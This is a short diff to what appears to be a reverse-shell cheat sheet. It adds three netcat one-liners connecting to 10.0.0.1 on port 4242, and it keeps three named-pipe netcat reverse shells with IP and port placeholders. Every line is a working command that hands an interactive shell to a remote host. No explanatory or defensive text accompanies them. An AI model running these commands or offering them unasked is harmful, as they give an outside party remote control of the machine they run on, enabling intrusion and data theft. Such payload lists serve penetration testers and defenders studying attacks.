@@ -1,3 +1,6 @@
+nc -e /bin/sh 10.0.0.1 4242
+nc -e /bin/bash 10.0.0.1 4242
+nc -c bash 10.0.0.1 4242
 rm -f /tmp/x; mknod /tmp/x p && nc <IP> <PORT> 0</tmp/x | /bin/bash 1>/tmp/x 
 rm -f /tmp/x; mknod /tmp/x p && /bin/nc.openbsd <IP> <PORT> 0</tmp/x | /bin/bash 1>/tmp/x
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> > /tmp/f
